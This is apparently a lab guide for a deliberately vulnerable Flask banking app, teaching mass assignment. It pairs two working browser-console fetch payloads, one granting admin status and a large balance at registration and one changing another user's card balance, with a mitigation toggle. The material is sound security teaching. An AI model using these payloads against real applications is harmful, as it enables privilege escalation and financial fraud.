# Mass Assignment
MA allows any properties of a given object to be modified without any filtering or verification.

```mermaid
sequenceDiagram
    actor Attacker
    participant Browser_or_CLI as Browser/CLI
    participant Flask_App as Flask App
    participant Target_Endpoint as Target Endpoint
    participant Field_Whitelist as Field Whitelist Check
    participant Database as Database

    Attacker->>Browser_or_CLI: Send payload with extra/unexpected fields
    Browser_or_CLI->>Flask_App: POST endpoint request
    Flask_App->>Target_Endpoint: Process incoming JSON body

    alt Vulnerable mode
        Target_Endpoint->>Database: Persist/update all client-supplied fields
        Database-->>Target_Endpoint: Unauthorized field changes applied
    else Hardened mode
        Target_Endpoint->>Field_Whitelist: Validate allowed fields only
        Field_Whitelist-->>Target_Endpoint: Reject unexpected keys
        Target_Endpoint->>Database: Persist/update only whitelisted fields
        Database-->>Target_Endpoint: Authorized changes only
    end

    Target_Endpoint-->>Flask_App: Build response
    Flask_App-->>Browser_or_CLI: Return result
    Browser_or_CLI-->>Attacker: Display outcome
```

## Prerequisites
At least one user account with at least one virtual card of any balance and limit.

## Demonstrations
This vulnerability is present in two different functions within app.py. Steps for exploitation and verification of hardening are as follows.

### register()
Allows attacker to create a user account with any properties and values (e.g. admin status; inflated balance).

```mermaid
sequenceDiagram
    participant register() endpoint
    participant ALLOWED_REGISTRATION_FIELDS whitelist
    participant Users Table

    alt Vulnerable mode
        register() endpoint->>Users Table: INSERT with dynamic fields from user_data
        Users Table-->>register() endpoint: Account created with attacker-supplied extra properties
    else Hardened mode
        register() endpoint->>ALLOWED_REGISTRATION_FIELDS whitelist: Allow only username and password
        ALLOWED_REGISTRATION_FIELDS whitelist-->>register() endpoint: Reject is_admin, balance, and other unexpected keys
        register() endpoint->>Users Table: INSERT only whitelisted fields
        Users Table-->>register() endpoint: Account created with safe defaults
    end
```

#### Exploit
1. Navigate/return to base URL (Vulnerable Bank homepage) and open the browser console.
2. Issue the following fetch request as a command and observe the outcome:

    ```fetch('http://localhost:5000/register', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        username: 'hacker4', // Can be any string
        password: 'password123',
        is_admin: true,
        balance: 999999.99
    })
    })
    .then(response => response.json())
    .then(data => console.log(JSON.stringify(data, null, 2)))
![alt text](./screenshots/image-14.png)

#### Mitigate
Return to root URL (Vulnerable Bank homepage) and click Toggle Mitigation button. Repeat attack and observe outcome:
![alt text](./screenshots/image-15.png)

### update_card_limit()
Allows attacker to change the limit of any virtual card.

```mermaid
sequenceDiagram
    participant update_card_limit() endpoint
    participant MA.update_card_limit_hardened()
    participant Virtual Cards Table

    alt Vulnerable mode
        update_card_limit() endpoint->>Virtual Cards Table: UPDATE using all JSON keys from payload
        Virtual Cards Table-->>update_card_limit() endpoint: Extra fields (for example current_balance) are modified
    else Hardened mode
        update_card_limit() endpoint->>MA.update_card_limit_hardened(): Enforce allowed_fields=['card_limit']
        MA.update_card_limit_hardened()-->>update_card_limit() endpoint: Reject unexpected fields with ValueError
        update_card_limit() endpoint->>Virtual Cards Table: UPDATE only card_limit
        Virtual Cards Table-->>update_card_limit() endpoint: Only authorized field change applied
    end
```

#### Exploit
1. Log in as any user or navigate/return to root URL (Vulnerable Bank homepage) and open the browser console.
2. Issue the following fetch request as a command -- where <vc_num> is a Virtual Card ID of any user -- and observe outcome:

    ```fetch('/api/virtual-cards/<vc_num>/update-limit', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
    },
    body: JSON.stringify({
        card_limit: 2500,
        current_balance: 999999 // illegal field for error
    }),
    }).then(async (r) => {
    console.log('HTTP', r.status);
    console.log(await r.json());
    });

![alt text](./screenshots/image-16.png)

#### Mitigate
Return to root URL (Vulnerable Bank homepage) and click Toggle Mitigation button. Repeat attack and observe outcome.
